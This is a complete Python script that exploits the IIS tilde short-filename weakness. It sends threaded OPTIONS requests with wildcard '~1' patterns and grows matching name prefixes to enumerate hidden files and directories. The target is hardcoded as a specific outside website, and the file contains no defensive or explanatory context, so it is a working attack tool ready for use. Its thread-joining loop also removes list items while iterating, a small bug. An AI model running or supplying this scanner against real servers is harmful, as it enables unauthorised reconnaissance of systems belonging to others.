import requests
from threading import *

S = "qwertyuiopasdfghjklzxcvbnm0123456789_-"


def scan_1_url(url):
    for i in S:
        a = url + "/%s*~1****/" % i
        # print(a)
        t = Thread(target=handler, args=(a, url_list))
        tlist.append(t)
        t.start()
    t_join()

def scan_url(urls):
    global url_list

    scan_urls = urls
    url_list = []
    for url in scan_urls:
        for i in S:
            a = url[0:-8] + i + url[-8:]
            t = Thread(target=handler, args=(a, url_list))
            tlist.append(t)
            t.start()
    t_join()

def handler(a, ulist):
    try:
        r = requests.options(a)
        if r.status_code == 404:
            mutex.acquire()
            ulist.append(a)
            print(a)
            mutex.release()
    except Exception:
        pass


def t_join():
    global tlist
    for t in tlist:
        t.join()
        tlist.remove(t)


url_list = []
tlist = []
mutex = Lock()


def main():
    url = "http://site.mcggo.com"
    scan_1_url(url)

    for i in range(0, 5):
        scan_url(url_list)

    print("********************************************")
    for each in url_list:
        print(each)


if __name__ == "__main__":
    main()
